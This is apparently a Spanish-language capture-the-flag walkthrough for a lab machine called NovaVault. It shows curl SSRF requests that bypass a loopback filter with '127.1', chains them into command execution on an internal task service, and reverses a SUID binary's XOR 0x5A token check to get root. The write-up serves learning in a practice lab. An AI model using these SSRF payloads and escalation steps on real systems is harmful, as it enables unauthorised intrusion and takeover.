---
tags: [ctf, thehackerslabs, linux, walkthrough, ssrf, reversing]
tipo: walkthrough
estado: resuelto
---

# NovaVault — Walkthrough

> [!note] **comando → salida relevante → interpretación → por qué**. Salidas *(reconstrucción)* del material de la misión.

## Paso 1 — Reconocimiento

**Comando**
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 192.168.56.13
echo "192.168.56.13 api.novavault.thl" | sudo tee -a /etc/hosts
curl -s http://api.novavault.thl/
```

**Interpretación / por qué**
- La app es un **API Gateway** Flask; los endpoints revelan la superficie.

## Paso 2 — SSRF en `/api/v1/vault/inspect` con bypass `127.1`

**Comando**
```bash
# petición normal (bloqueada si apunta a loopback)
curl -s -X POST http://api.novavault.thl/api/v1/vault/inspect \
  -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:5000/"}'
# bypass de la validación de loopback
curl -s -X POST http://api.novavault.thl/api/v1/vault/inspect \
  -H 'Content-Type: application/json' -d '{"url":"http://127.1:5000/"}'
```

**Interpretación / por qué**
- La validación bloquea `127.0.0.1` pero **no** `127.1` (misma dirección interpretada de otra forma). El SSRF revela **servicios internos**.

## Paso 3 — Descubrimiento de `/api/v1/docs` → SSRF POST `/api/v1/vault/sync`

**Comando**
```bash
curl -s http://api.novavault.thl/api/v1/docs
curl -s -X POST http://api.novavault.thl/api/v1/vault/sync \
  -H 'Content-Type: application/json' -d '{"service":"tasks","action":"..."}'
```

**Interpretación / por qué**
- `/docs` documenta endpoints internos. `/vault/sync` permite hacer **POST** desde el servidor → despacha al **servicio interno de tareas**.
- Cuidado con el **quoting** en JSON.

## Paso 4 — Command execution → `www-data` → `crypto-operators` → user flag

**Comando**
```bash
# a través del servicio interno de tareas se logra ejecutar comandos
id
cat /home/<usuario>/user.txt      # si el grupo lo permite
ls -l /ruta/a/user.txt
groups
```

**Interpretación / por qué**
- El servicio ejecuta comandos como `www-data`. El usuario pertenece al grupo **`crypto-operators`**, que otorga lectura de la **user flag**.

## Paso 5 — SUID `vault-guard` → reversing → XOR `0x5A` → root

**Comando**
```bash
find / -perm -4000 -type f 2>/dev/null
file /usr/local/bin/vault-guard
strings -a /usr/local/bin/vault-guard | less
objdump -d -M intel /usr/local/bin/vault-guard | sed -n '/verify_recovery_token/,/ret/p'
```

**Interpretación / por qué**
- `verify_recovery_token` valida un token tras **XOR `0x5A`**. Entendiendo el algoritmo se construye un token válido y se usa el **mecanismo de recuperación** del laboratorio para obtener root.
- **Ojo:** diferencia entre una shell root y comandos ejecutados fuera de ella; limpiar artefactos.

## Qué funcionó

- Bypass de loopback con `127.1`.
- Encadenar SSRF GET → SSRF POST.
- Revisar **grupos** del usuario.
- Reversing del binario SUID con `objdump`.

## Qué falló (y por qué)

- SSRF apuntando a `127.0.0.1` bloqueado por validación.

## Qué aprendí

- Diferencia shell root vs ejecución puntual.
- Reversing de validación de tokens (XOR).
